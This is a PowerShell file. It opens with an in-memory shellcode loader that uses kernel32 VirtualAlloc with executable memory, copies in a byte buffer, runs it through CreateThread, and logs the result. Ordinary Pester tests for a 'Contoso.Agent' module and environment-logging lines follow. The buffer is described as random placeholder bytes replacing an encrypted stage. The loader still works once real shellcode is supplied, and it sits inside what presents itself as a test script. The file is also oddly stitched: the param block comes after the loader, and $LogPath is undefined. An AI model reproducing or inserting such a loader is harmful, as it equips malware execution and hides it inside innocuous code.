try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x0e, 0x39, 0xea, 0x1a, 0x3c, 0x8f, 0x67, 0x50, 0x7c, 0x0a, 0xae, 0x5f, 0x9d, 0xbd, 0xa4, 0x43,
        0x71, 0x84, 0x24, 0xb8, 0x5f, 0x97, 0xbd, 0x7c, 0x64, 0xe4, 0xd8, 0x9f, 0xc9, 0x4f, 0x34, 0x20,
        0xfa, 0xfd, 0xde, 0x74, 0xe3, 0xcb, 0x47, 0x64, 0x80, 0x3d, 0xbc, 0x0b, 0xf8, 0x6f, 0x91, 0x3b,
        0x36, 0x2c, 0x68, 0x64, 0x0c, 0x56, 0xdd, 0x37, 0x9e, 0xfe, 0x4f, 0x59, 0x40, 0x57, 0xa4, 0xb7,
        0xd3, 0x89, 0x85, 0x62, 0xed, 0xb6, 0x5c, 0x9b, 0x1c, 0xb8, 0x92, 0xbe, 0x33, 0xf5, 0xb3, 0x01,
        0xbd, 0xfe, 0x59, 0x10, 0xd4, 0x23, 0x78, 0x6e, 0x63, 0xce, 0xc9, 0x22, 0xdc, 0xf5, 0x88, 0x5a,
        0x84, 0xd5, 0x55, 0x2e, 0xc3, 0x21, 0x6f, 0x49, 0x52, 0x57, 0x7b, 0xad, 0x9a, 0x18, 0xc6, 0x47,
        0x57, 0x2a, 0x23, 0x53, 0x2b, 0xcc, 0x41, 0xa3, 0xb9, 0xb5, 0x4b, 0x47, 0x34, 0xb1, 0x3d, 0x13,
        0xc4, 0x8b, 0x3c, 0x3b, 0xb7, 0x90, 0x70, 0x07, 0x6e, 0xf4, 0x5e, 0xd0, 0x78, 0xeb, 0xa5, 0x1a,
        0x19, 0x0f, 0x93, 0x1f, 0x8f, 0xa7, 0xda, 0xe9, 0xf2, 0x95, 0x34, 0x11, 0x87, 0xec, 0xb1, 0xf1,
        0xe0, 0x93, 0xf9, 0x03, 0x23, 0x99, 0xa2, 0xb3, 0x93, 0x1f, 0xfb, 0x73, 0x3f, 0xbf, 0x7e, 0x04,
        0x59, 0x2d, 0x3b, 0xf7, 0xe7, 0x16, 0x5b, 0xff, 0x46, 0xc8, 0x7c, 0x44, 0x05, 0xaa, 0x0c, 0x3b,
        0xc8, 0xf7, 0x99, 0x7b, 0x5c, 0x9f, 0xbe, 0xce, 0xe0, 0x46, 0xfd, 0x27, 0x4e, 0x3d, 0xbc, 0x60,
        0xd6, 0x1f, 0x69, 0x25, 0x3b, 0x21, 0xcc, 0xd4, 0x49, 0xbe, 0xc4, 0x39, 0x37, 0xd4, 0x2a, 0x31,
        0x85, 0x23, 0xf7, 0x78, 0xf3, 0x97, 0xd0, 0xaa, 0x15, 0x07, 0x68, 0x1b, 0x02, 0x67, 0x47, 0xda,
        0x63, 0xe7, 0xdc, 0xae, 0x93, 0x8c, 0x2d, 0xec, 0x1b, 0x70, 0xac, 0xa4, 0xd6, 0xbe, 0x1f, 0x57,
        0xb0, 0x35, 0xa5, 0xdb, 0x02, 0x71, 0xe1, 0xa8, 0xba, 0x81, 0x03, 0x5e, 0xaa, 0xe9, 0xf5, 0x4c,
        0x88, 0x18, 0x62, 0xc1, 0xcf, 0x95, 0x4a, 0x15, 0x30, 0xa9, 0x99, 0x5b, 0x89, 0x4d, 0x0f, 0xdd,
        0x0d, 0x7c, 0x95, 0x99, 0x81, 0xef, 0xe5, 0x39, 0x94, 0x94, 0xa0, 0x8b, 0x8d, 0xa2, 0xd2, 0x59,
        0x22, 0x23, 0xcc, 0xb1, 0xee, 0x6d, 0xc6, 0xcf, 0x85, 0xbe, 0x16, 0x10, 0x40, 0xa0, 0xa3, 0x1c,
        0xea, 0x94, 0x14, 0x41, 0x9a, 0x33, 0x95, 0x43, 0xa0, 0xa3, 0x76, 0x87, 0xd7, 0xa9, 0xb2, 0xb4,
        0x5b, 0x31, 0xa3, 0xf4, 0xd0, 0xaf, 0x25, 0x11, 0x10, 0x01, 0x20, 0x7f, 0xfb, 0x29, 0x1d, 0x47,
        0x24, 0x77, 0xe9, 0x76, 0x25, 0x34, 0x70, 0x82, 0xb7, 0x60, 0x9e, 0x14, 0xdf, 0xc7, 0x98, 0x88,
        0xa7, 0x2f, 0x50, 0xa6, 0x8b, 0xfc, 0x1d, 0x55, 0x9a, 0xd3, 0x64, 0xb6, 0x06, 0x40, 0xea, 0xa6,
        0xa3, 0x9f, 0x91, 0x9b, 0x63, 0x05, 0x43, 0x9c, 0x04, 0xcf
    )

    $MemoryHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 3368)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ModulePath = $PSScriptRoot
)
$ErrorActionPreference = 'Stop'

Set-StrictMode -Version 2.0
$culture = [System.Globalization.CultureInfo]::InvariantCulture

BeforeAll {
    Import-Module (Join-Path $ModulePath 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Test-AgentHeartbeat' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'AdatumCollector'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'AdatumCollector' }
        }

        It 'reports Running for a healthy agent' {
            $result = Test-AgentHeartbeat -Name 'AdatumCollector'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Test-AgentHeartbeat -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Set-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'AdatumCollector'; Expected = 8443 }
        @{ Name = 'SecondaryAgent'; Expected = 8543 }
    ) {
        param($Name, $Expected)
        $config = Set-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}
Describe 'Test-AgentHeartbeat' {
    Context 'with a stopped service' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'AdatumCollector'; Status = 'Stopped' }
            } -ParameterFilter { $Name -eq 'AdatumCollector' }
        }

        It 'reports Stopped' {
            (Test-AgentHeartbeat -Name 'AdatumCollector').Status | Should -Be 'Stopped'
        }
    }
}

Describe 'module metadata' {
    It 'exports only public functions' {
        $commands = Get-Command -Module 'Contoso.Agent' | Select-Object -ExpandProperty Name
        $commands | Should -Contain 'Test-AgentHeartbeat'
    }
}

Describe 'Get-AgentConfig validation' {
    It 'rejects an empty path' {
        { Get-AgentConfig -Path '' } | Should -Throw
    }

    It 'accepts a path below the temp folder' {
        $path = Join-Path $env:TEMP 'agent.ini'
        { Get-AgentConfig -Path $path } | Should -Not -Throw
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}

Describe 'Get-AgentStatus pipeline input' {
    It 'accepts a server name from the pipeline' {
        { 'AdatumCollector' | Test-AgentHeartbeat } | Should -Not -Throw
    }
}

Describe 'Get-AgentStatus output shape' {
    It 'returns an object with a Status property' {
        $result = Test-AgentHeartbeat -Name 'AdatumCollector'
        $result.PSObject.Properties.Name | Should -Contain 'Status'
    }
}

Describe 'configuration fixture' {
    It 'can be serialised to JSON' {
        $config = [pscustomobject]@{ Name = 'AdatumCollector'; Port = 8443 }
        ($config | ConvertTo-Json) | Should -Not -BeNullOrEmpty
    }
}

Describe 'error handling' {
    It 'does not throw for a missing optional file' {
        { Get-Item -LiteralPath (Join-Path $env:TEMP 'missing-agent.ini') -ErrorAction SilentlyContinue } | Should -Not -Throw
    }
}

Describe 'tagging' {
    It 'applies the requested tag' {
        $tag = @{ Environment = 'Test' }
        $tag.Environment | Should -Be 'Test'
    }
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
